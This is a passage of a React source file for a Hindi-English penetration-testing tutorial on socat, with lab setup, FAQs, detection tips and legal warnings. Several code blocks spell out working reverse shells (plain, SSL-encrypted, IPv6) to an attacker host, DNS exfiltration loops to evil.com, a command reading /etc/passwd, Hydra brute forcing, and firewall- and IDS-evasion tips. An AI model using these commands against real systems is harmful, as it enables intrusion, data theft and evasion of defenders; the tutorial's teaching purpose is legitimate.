          { q: 'IPv6 connection नहीं हो रहा', a: 'socat TCP6-LISTEN:port,reuseaddr - use करो। System में IPv6 enable है या check करो: ip a | grep inet6' },
          { q: 'Permission denied error आ रहा है', a: 'Ports below 1024 के लिए sudo चाहिए। या higher port use करो (4444+)। SELinux/AppArmor check करो।' },
          { q: 'Fork mode में zombie processes बन रहे हैं', a: 'Systemd socket activation use करो। या wrapper script बनाओ जो zombie cleanup करे। wait command use करो।' },
          { q: 'UNIX socket permission error', a: 'Socket file permissions check करो: ls -la /path/to/socket। chmod 666 से permission दो। Directory permissions भी check करो।' },
          { q: 'Serial port connection slow है', a: 'Baud rate match करो target device के साथ। raw mode use करो। echo=0 set करो।' },
          { q: 'Socat process CPU 100% use कर रहा है', a: 'connect-timeout set करो। retry option use करो infinite loop की जगह। sleep delay add करो reconnect script में।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        Socat-based attacks को detect और prevent करने के तरीके:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Network Traffic Monitoring:</strong> Unusual port connections detect करें — NetFlow, sFlow, या IDS alerts</li>
        <li><strong className="text-white">SSL/TLS Inspection:</strong> Encrypted shells detect करने के लिए SSL inspection proxy use करें</li>
        <li><strong className="text-white">Host-based Firewall:</strong> Unnecessary outbound connections block करें — default deny policy</li>
        <li><strong className="text-white">Process Monitoring:</strong> socat process कहाँ से run हो रहा है चेक करें — EDR solutions</li>
        <li><strong className="text-white">Application Whitelisting:</strong> केवल authorized binaries चलने दें — AppLocker, SELinux</li>
        <li><strong className="text-white">Network Segmentation:</strong> Lateral movement रोकें — VLAN, firewall rules</li>
        <li><strong className="text-white">Endpoint Detection (EDR):</strong> Suspicious process activity detect करें — CrowdStrike, Sentinel</li>
        <li><strong className="text-white">DNS Monitoring:</strong> DNS tunneling detect करें — unusual DNS queries</li>
        <li><strong className="text-white">Behavioral Analysis:</strong> Unusual data transfer patterns detect करें — ML-based detection</li>
        <li><strong className="text-white">Honeypots:</strong> Decoy systems लगाओ — socat connections detect होंगी</li>
        <li><strong className="text-white">Anomaly Detection:</strong> Unusual process names और parent-child relationships detect करें</li>
        <li><strong className="text-white">Network Forensics:</strong> Packet capture और analysis — Wireshark, tcpdump</li>
      </ul>

      <h2>Lab Environment Setup</h2>
      <p>
        Socat सीखने के लिए safe lab environment बनाएं:
      </p>
      <CodeBlock
        title="लैब सेटअप"
        code={`# दो machines चाहिए (VMs या containers):

# Machine 1 (Attacker):
sudo apt install socat openssl
# IP: 192.168.1.100

# Machine 2 (Target):
sudo apt install socat
# IP: 192.168.1.200

# Test 1: Basic connection
# Machine 1: socat TCP-LISTEN:4444,reuseaddr -
# Machine 2: socat - TCP:192.168.1.100:4444

# Test 2: File transfer
# Machine 1: socat TCP-LISTEN:4444,reuseaddr FILE:test.txt,create
# Machine 2: socat FILE:data.txt TCP:192.168.1.100:4444

# Test 3: Reverse shell
# Machine 1: socat FILE:\`tty\`,raw,echo=0 TCP-LISTEN:4444,reuseaddr
# Machine 2: socat TCP:192.168.1.100:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Test 4: SSL encrypted shell
# Certificate generate:
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt
cat shell.key shell.crt > shell.pem
# Machine 1: socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 FILE:\`tty\`,raw,echo=0
# Machine 2: socat OPENSSL:192.168.1.100:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Docker lab:
docker run -it --name socat-lab alpine apk add socat bash openssl
docker run -it --name socat-target alpine apk add socat bash`}
      />

      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="एडवांस्ड Socat Techniques"
        code={`# OpenSSL encrypted reverse shell with client cert verification:
openssl req -newkey rsa:2048 -nodes -keyout client.key -x509 -days 30 -out client.crt
cat client.key client.crt > client.pem
# Attacker:
socat OPENSSL-LISTEN:4444,cert=shell.pem,cafile=client.crt,verify=1 FILE:\`tty\`,raw,echo=0
# Victim:
socat OPENSSL:ATTACKER_IP:4444,cert=client.pem,cafile=shell.crt,verify=1 EXEC:/bin/bash,pty,stderr,setsid

# Serial port communication:
socat /dev/ttyUSB0,raw,echo=0,b115200 -

# Named pipe (FIFO) relay:
mkfifo /tmp/mypipe
socat TCP-LISTEN:4444,reuseaddr PIPE:/tmp/mypipe

# HTTP CONNECT proxy:
socat TCP-LISTEN:8080,reuseaddr,fork PROXY:proxy.example.com:target_ip:80,proxyport=3128

# SCTP connection (telecom protocol):
socat SCTP-LISTEN:4444,reuseaddr -

# TUN/TAP interface:
socat TUN:192.168.100.1/24,up -

# Datagram UNIX socket:
socat UNIX-SENDTO:/tmp/dgram.sock -

# UDP broadcast:
socat UDP-DATAGRAM:255.255.255.255:9999,broadcast,reuseaddr -

# Exec with environment variables:
socat TCP-LISTEN:4444,reuseaddr EXEC:"env HOME=/tmp /bin/bash",pty,stderr,setsid

# Log all traffic to file:
socat -v TCP-LISTEN:4444,reuseaddr TCP:target:80 2>&1 | tee traffic.log

# Connection retry with backoff:
socat TCP:target:4444,retry=3,intervall=5 EXEC:/bin/bash

# IPv6 reverse shell:
socat TCP6:ATTACKER_IP:4444 EXEC:/bin/bash,pty,stderr,setsid

# Encrypted file transfer with progress:
pv large_file.bin | socat - OPENSSL:target:4444,verify=0`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'क्या Socat Netcat से बेहतर है?', a: 'ज़्यादातर cases में हाँ — SSL/TLS, UNIX sockets, TTY shell support, serial ports। लेकिन simple tasks के लिए Netcat आसान है। Socat syntax ज़्यादा complex है लेकिन features बहुत ज़्यादा हैं।' },
          { q: 'Encrypted shell कैसे बनाएं?', a: 'SSL certificate generate करो (openssl req), OPENSSL-LISTEN और OPENSSL use करो। verify=0 से certificate validation skip होगा। Wireshark में data encrypted दिखेगा।' },
          { q: 'Multiple connections handle कैसे करें?', a: 'fork option लगाओ — हर new connection के लिए अलग process बनेगा। TCP-LISTEN:port,reuseaddr,fork - use करो।' },
          { q: 'Port forwarding कैसे करें?', a: 'socat TCP-LISTEN:local_port,reuseaddr TCP:target:target_port — बस इतना simple है। fork add करो multiple connections के लिए।' },
          { q: 'क्या Socat Windows पर चलता है?', a: 'हाँ, Windows Subsystem for Linux (WSL) में चलता है। Native Windows port भी available है (Cygwin)।' },
          { q: 'File transfer कैसे करें?', a: 'Sender: socat FILE:data.txt TCP:target:port। Receiver: socat TCP-LISTEN:port,reuseaddr FILE:received.txt,create। SSL से encrypt भी कर सकते हो।' },
          { q: 'UNIX socket forwarding क्या है?', a: 'Docker socket, database socket जैसे local sockets को TCP पर forward करना — remote access के लिए। socat TCP-LISTEN:port UNIX-CONNECT:/path/to/socket' },
          { q: 'Serial port communication कैसे करें?', a: 'socat /dev/ttyUSB0,raw,echo=0,b115200 - — baud rate match करो target device के साथ। IoT और embedded systems के लिए useful।' },
          { q: 'Persistent connection कैसे बनाएं?', a: 'retry और intervall options use करो। Auto-reconnect while loop script बनाओ। Systemd service बनाओ production के लिए।' },
          { q: 'Socat कैसे debug करें?', a: '-v (verbose) और -d -d (debug level 2) flags use करो। -x से hex dump देख सकते हो। -lf से log file specify करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Real-World Case Studies</h2>
      <p>
        Socat real-world penetration testing scenarios में बहुत commonly use होता है। Red team operators इसे daily basis पर use करते हैं क्योंकि यह reliable, versatile, और most environments में available होता है। SSL encrypted shells की वजह से यह Netcat से ज़्यादा preferred है modern engagements में।
      </p>
      <p>
        एक common scenario है — internal network penetration test में attacker को jump host मिलता है जिसमें Socat installed है। Attacker Socat से port forwarding setup करके internal database server तक पहुंच बनाता है। SOCKS proxy बनाकर पूरे internal network को browse कर सकता है। Firewall rules bypass करने के लिए Socat double relay technique use होती है।
      </p>
      <p>
        IoT penetration testing में Socat serial port communication के लिए essential है। Router, switch, और embedded devices के UART/JTAG interfaces से communicate करने के लिए Socat सबसे आसान तरीका है। Hardware hacking CTF challenges में भी Socat बहुत use होता है। एक real case में researcher ने Socat से smart home hub के serial port access करके root shell प्राप्त किया।
      </p>
      <p>
        Cloud environments में Docker socket forwarding Socat से बहुत common attack vector है। अगर Docker socket exposed है तो attacker Socat से remote Docker access ले सकता है। Kubernetes clusters में भी API server socket forwarding Socat से किया जाता है। Incident response teams भी Socat use करती हैं — compromised systems पर evidence collection के लिए encrypted file transfer channels बनाने में।
      </p>

      <h2>Integration with Other Tools</h2>
      <p>
        Socat अकेले powerful है लेकिन दूसरे tools के साथ combine करने पर और भी ज़्यादा effective बन जाता है। Network penetration testing toolkit में Socat का role relay और proxy का है जो दूसरे tools को connect करता है।
      </p>
      <CodeBlock
        title="Integration Examples"
        code={`# Nmap + Socat (port forwarding for internal scanning):
# Jump host पर Socat listener:
socat TCP-LISTEN:8080,reuseaddr,fork TCP:internal_host:80
# Attacker पर Nmap scan:
nmap -sV -p 8080 jump_host

# Metasploit + Socat (reverse shell handler):
# Socat relay बनाओ Metasploit listener तक:
socat TCP-LISTEN:4444,reuseaddr TCP:msf_listener:4444
# Victim Socat shell connect होगा Metasploit handler से

# Chisel + Socat (double tunnel):
# Chisel SOCKS proxy → Socat port forward:
socat TCP-LISTEN:9090,reuseaddr SOCKS4A:localhost:internal:80,socksport=1080

# SSH + Socat (jump host tunneling):
# Socat से SSH tunnel create करो:
socat TCP-LISTEN:2222,reuseaddr TCP:target:22
# फिर SSH: ssh -p 2222 user@localhost

# Wireshark + Socat (remote capture view):
# Remote server पर:
socat TCP-LISTEN:4444,reuseaddr SYSTEM:"tcpdump -i eth0 -w - port 80"
# Local machine पर:
socat TCP:remote:4444 EXEC:"wireshark -k -i -"

# Hydra + Socat (brute force through proxy):
socat TCP-LISTEN:8080,reuseaddr TCP:target:80
hydra -l admin -P wordlist.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"`}
      />

      <h2>Performance Tuning</h2>
      <p>
        High-throughput environments में Socat efficiently चलाने के लिए कुछ optimization techniques हैं। Production servers पर Socat port forwarder use करते समय performance critical हो जाता है।
      </p>
      <CodeBlock
        title="Performance Optimization"
        code={`# Buffer size increase (high throughput):
socat TCP-LISTEN:8080,reuseaddr,fork,sndbuf=1048576,rcvbuf=1048576 TCP:target:80

# Connection limits (prevent resource exhaustion):
socat TCP-LISTEN:8080,reuseaddr,fork,max-children=100 TCP:target:80

# TCP tuning options:
socat TCP-LISTEN:8080,reuseaddr,fork,nodelay TCP:target:80
# nodelay = disable Nagle algorithm (lower latency)

# Keep-alive settings:
socat TCP:target:80,keepalive TCP-LISTEN:8080,reuseaddr,fork

# Timeout optimization:
socat TCP-LISTEN:8080,reuseaddr,fork,connect-timeout=5 TCP:target:80

# Multiple listeners (load distribution):
for port in 8081 8082 8083 8084; do
  socat TCP-LISTEN:$port,reuseaddr,fork TCP:target:80 &
done

# Memory-efficient mode (embedded systems):
socat TCP-LISTEN:8080,reuseaddr TCP:target:80

# Systemd service with resource limits:
# [Service]
# LimitNOFILE=65536
# LimitNPROC=4096`}
      />

      <h2>Reporting and Output Analysis</h2>
      <p>
        Penetration testing engagements में Socat activities को document और analyze करना ज़रूरी है। Clients को report देनी होती है और findings properly document होने चाहिए। Socat logging capabilities से detailed activity logs capture कर सकते हो।
      </p>
      <CodeBlock
        title="Logging and Analysis"
        code={`# Traffic logging with timestamps:
socat -v TCP-LISTEN:8080,reuseaddr TCP:target:80 2>&1 | \\
  while read line; do echo "$(date '+%Y-%m-%d %H:%M:%S') $line"; done | \\
  tee socat_session.log

# Connection logging:
socat -d -d TCP-LISTEN:8080,reuseaddr TCP:target:80 2>socat_debug.log
# -d -d = debug level 2 (connection details)

# Hex dump traffic capture:
socat -x -v TCP-LISTEN:8080,reuseaddr TCP:target:80 2>hex_dump.log
# Wireshark-compatible analysis के लिए pcap में convert:
tcpdump -r hex_dump.log -w traffic.pcap

# Session recording (for evidence):
socat -v TCP-LISTEN:4444,reuseaddr EXEC:/bin/bash,pty,stderr,setsid 2>&1 | \\
  tee session_$(date +%Y%m%d_%H%M%S).log

# Connection statistics:
socat -d -d TCP-LISTEN:8080,reuseaddr TCP:target:80 2>&1 | \\
  grep "starting data transfer" | wc -l

# Port forwarding health check:
#!/bin/bash
while true; do
  if ! socat /dev/null TCP:localhost:8080,connect-timeout=2 2>/dev/null; then
    echo "[DOWN] Port 8080 forwarding failed at $(date)" >> health.log
  fi
  sleep 30
done`}
      />

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Netcat</td><td className="py-2 px-3">Network utility</td><td className="py-2 px-3">सबसे simple और widespread</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Ncat</td><td className="py-2 px-3">Netcat with SSL</td><td className="py-2 px-3">Nmap का version, SSL support</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Chisel</td><td className="py-2 px-3">TCP/UDP tunneling</td><td className="py-2 px-3">HTTP tunnel, firewall bypass</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">CryptCat</td><td className="py-2 px-3">Encrypted Netcat</td><td className="py-2 px-3">Twofish encryption built-in</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">PowerCat</td><td className="py-2 px-3">PowerShell Netcat</td><td className="py-2 px-3">Windows PowerShell में चलता है</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">stunnel</td><td className="py-2 px-3">SSL/TLS wrapper</td><td className="py-2 px-3">किसी भी TCP connection को SSL में wrap</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">rninetd</td><td className="py-2 px-3">Network daemon</td><td className="py-2 px-3">Service management, port multiplexing</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">netpipes</td><td className="py-2 px-3">Pipe-based networking</td><td className="py-2 px-3">Shell scripts में network connections</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Firewall Evasion</h2>
      <p>
        Socat firewall bypass techniques penetration testing में बहुत useful हैं। Egress filtering bypass करने के लिए Socat कई methods provide करता है — HTTP tunneling, SSL encapsulation, port hopping, और protocol switching। Red team operations में these techniques commonly use होती हैं।
      </p>
      <CodeBlock
        title="Firewall Bypass Techniques"
        code={`# HTTP tunnel (port 80/443 through firewall):
socat TCP-LISTEN:443,reuseaddr,fork PROXY:firewall_ip:target:443,proxyport=8080

# Port hopping (multiple ports):
for port in 80 443 8080 8443; do
  socat TCP-LISTEN:$port,reuseaddr,fork TCP:internal_target:$port &
done

# DNS-based tunnel (port 53 usually allowed):
# DNS queries के through data exfiltrate करो
socat TCP:target:4444 EXEC:"while read line; do dig $line.evil.com +short; done"

# ICMP tunnel (ping allowed होता है):
# Ping packets के through data send करो

# SSL wrapping (encrypted traffic looks normal):
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork TCP:internal:80

# Protocol switching (TCP → UDP → TCP):
socat TCP-LISTEN:8080,reuseaddr UDP:target:53
socat UDP-LISTEN:53,reuseaddr TCP:target:8080

# Traffic fragmentation (IDS evasion):
socat TCP-LISTEN:8080,reuseaddr TCP:target:80,frag=1`}
      />

      <h2>Tunneling Techniques</h2>
      <p>
        Socat tunneling capabilities बहुत powerful हैं — firewalls bypass करने, internal networks access करने, और encrypted channels बनाने के लिए। Tunneling penetration testing में सबसे common technique है जो restricted environments में access gain करने में help करती है। Socat की versatility इसे tunneling के लिए ideal tool बनाती है।
      </p>
      <CodeBlock
        title="Advanced Tunneling"
        code={`# HTTP CONNECT tunnel (firewall bypass):
socat TCP-LISTEN:8080,reuseaddr,fork PROXY:firewall:target:80,proxyport=3128

# SSL tunnel through proxy:
socat OPENSSL-LISTEN:4443,cert=shell.pem,verify=0 PROXY:proxy:target:443,proxyport=8080

# Chained tunnel (multi-hop):
# Machine A (attacker):
socat TCP-LISTEN:5555,reuseaddr TCP:jump1:5555
# Machine B (jump host 1):
socat TCP-LISTEN:5555,reuseaddr TCP:jump2:5555
# Machine C (jump host 2):
socat TCP-LISTEN:5555,reuseaddr TCP:target:22

# DNS tunnel (covert channel):
# Data DNS queries के through send करो:
socat TCP:target:4444 EXEC:"while read line; do nslookup $line.evil.com; done"

# ICMP tunnel (ping-based):
# socat ICMPv4:attacker:0 SYSTEM:"cat /etc/passwd"

# UDP-to-TCP bridge:
socat UDP-LISTEN:5353,reuseaddr TCP:target:53

# TCP-to-UDP bridge:
socat TCP-LISTEN:5353,reuseaddr UDP:target:53

# Reverse tunnel (external access to internal):
# Internal machine पर:
socat TCP:external_ip:4444,retry=30 TCP:localhost:80
# External machine पर:
socat TCP-LISTEN:4444,reuseaddr,fork -`}
      />

      <h2>Legal and Ethical Considerations</h2>
      <p>
        Socat एक dual-use tool है — legitimate system administration और penetration testing दोनों में use होता है। लेकिन reverse shells और encrypted communication channels बनाने की capability इसे dangerous भी बनाती है। Responsible use करना हर user की ज़िम्मेदारी है।
      </p>
      <p>
        भारत में IT Act 2000 की धारा 43 और 66 के तहत unauthorized network access गंभीर अपराध है। Socat से reverse shell बनाना, port forwarding करना, या encrypted channels establish करना — सब authorized environment में ही करें। Written permission हमेशा रखें। Lab environments (VMs, isolated networks) में practice करें। Professional engagements में scope document clearly define करें।
      </p>
      <p>
        Responsible disclosure भी ज़रूरी है — अगर Socat use करके कोई vulnerability discover करो तो vendor को privately report करो। Public disclosure से पहले patch का इंतज़ार करो। Bug bounty programs में rules of engagement follow करो। Socat जैसे powerful tools का सही इस्तेमाल cybersecurity ecosystem को stronger बनाता है।
      </p>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside text-gray-300 mt-2 space-y-1">
          <li>Socat की सबसे बड़ी ताकत है SSL encrypted reverse shell — IDS/IPS detect नहीं कर पाते</li>
          <li>Fully interactive TTY shell के लिए FILE:`tty`,raw,echo=0 use करो</li>
          <li>UNIX socket forwarding Docker और database connections के लिए बहुत useful है</li>
          <li>Netcat से migrate करो — Socat ज़्यादा reliable और feature-rich है</li>
          <li>Auto-reconnect script बनाओ — persistent access के लिए essential है</li>
          <li>SSL certificates reuse करो — हर बार generate करने की ज़रूरत नहीं</li>
          <li>fork option हमेशा लगाओ listener पर — multiple connections handle होंगी</li>
          <li>Serial port communication IoT hacking के लिए essential skill है</li>
          <li>-v flag से traffic log करो — debugging के लिए बहुत useful</li>
          <li>Systemd service बनाओ persistent port forwarding के लिए</li>
          <li>Syntax याद रखो: socat [options] address1 address2 — दो addresses connect करता है</li>
          <li>Debugging के लिए -d -d -d use करो — maximum verbosity मिलेगी</li>
          <li>Named pipes (mkfifo) Socat के साथ combine करके complex data flows बना सकते हो</li>
          <li>TUN/TAP interfaces से Socat VPN-like functionality दे सकता है</li>
          <li>SCTP protocol support telecom networks में testing के लिए useful है</li>
          <li>Socat man page बहुत detailed है — हर option explain है, ज़रूर पढ़ो</li>
          <li>Data transformation features (crlf, newline) HTTP testing में useful हैं</li>
          <li>Socat address types 30+ हैं — लगभग हर communication channel support होता है</li>
          <li>Error handling के लिए retry और intervall options combine करो</li>
          <li>Socat + tmux/screen combination persistent sessions के लिए best practice है</li>
          <li>Windows targets पर Socat binary drop करो — PowerShell से download और execute करो</li>
          <li>Network debugging के लिए -v -v flags use करो — maximum verbosity मिलेगी</li>
          <li>Socat address syntax याद रखो: TYPE:PARAMETER,OPTION1,OPTION2 — हमेशा यही pattern है</li>
          <li>Encrypted reverse shell certificate reuse करो — हर बार generate करने की ज़रूरत नहीं</li>
          <li>Socat man page 500+ pages है — specific section search करने के लिए /pattern use करो</li>
        </ul>
      </div>

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> Socat एक शक्तिशाली नेटवर्किंग टूल है जो reverse shells, port forwarding, encrypted connections, और data relay बनाने में सक्षम है। इसका इस्तेमाल केवल अधिकृत पेनेट्रेशन टेस्टिंग और सुरक्षा शोध के लिए करें। बिना अनुमति के नेटवर्क टूल्स का उपयोग अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत नेटवर्क एक्सेस अपराध हो सकता है। केवल अपने लैब वातावरण में ही प्रैक्टिस करें।
      </div>
    </TutorialLayout>
  )
}
